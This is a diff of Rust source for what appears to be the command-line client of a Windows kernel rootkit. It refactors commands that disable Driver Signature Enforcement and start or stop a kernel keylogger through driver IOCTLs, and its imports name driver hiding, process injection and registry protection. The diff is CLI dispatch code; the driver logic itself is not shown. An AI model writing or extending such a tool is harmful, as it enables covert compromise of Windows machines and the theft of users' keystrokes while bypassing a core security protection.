@@ -1,11 +1,8 @@
 use {
+    cli::*, 
     clap::Parser, 
     shared::ioctls::*,
     module::enumerate_module,
-    cli::{
-        Cli, Commands, ProcessCommands, ThreadCommands, 
-        InjectionCommands, Injection, RegistryCommands
-    }, 
     driver::{dse, enumerate_driver, unhide_hide_driver}, 
     keylogger::keylogger, 
     process::{
@@ -130,24 +127,27 @@ fn main() {
                 enumerate_driver(IOCTL_ENUMERATE_DRIVER);
             }
         },
-        Commands::DSE { disable, enable } => {
-            if *enable {
-                println!("[+] Enable DSE");
-                dse(IOCTL_ENABLE_DSE, true);
-            } else if *disable {
-                println!("[+] Disable DSE");
-                dse(IOCTL_ENABLE_DSE, false);
-            }
-        }
-        Commands::Keylogger { stop, start } =>  {
-            if *start {
-                println!("[+] Start Keylogger");
-                keylogger(IOCTL_KEYLOGGER, true);
-            } else if *stop {
-                println!("[+] Stop Keylogger");
-                keylogger(IOCTL_KEYLOGGER, false);
-            }
+        Commands::Misc { sub_command } => match sub_command {
+            MisCommands::DSE { disable, enable } =>  {
+                if *enable {
+                    println!("[+] Enable DSE");
+                    dse(IOCTL_ENABLE_DSE, true);
+                } else if *disable {
+                    println!("[+] Disable DSE");
+                    dse(IOCTL_ENABLE_DSE, false);
+                }
+            },
+            MisCommands::Keylogger { stop, start } => {
+                if *start {
+                    println!("[+] Start Keylogger");
+                    keylogger(IOCTL_KEYLOGGER, true);
+                } else if *stop {
+                    println!("[+] Stop Keylogger");
+                    keylogger(IOCTL_KEYLOGGER, false);
+                }
+            },
         },
+
         #[cfg(not(feature = "mapper"))]
         Commands::Registry { sub_command } => match sub_command {
             RegistryCommands::Protect { key, name, add, remove } => {
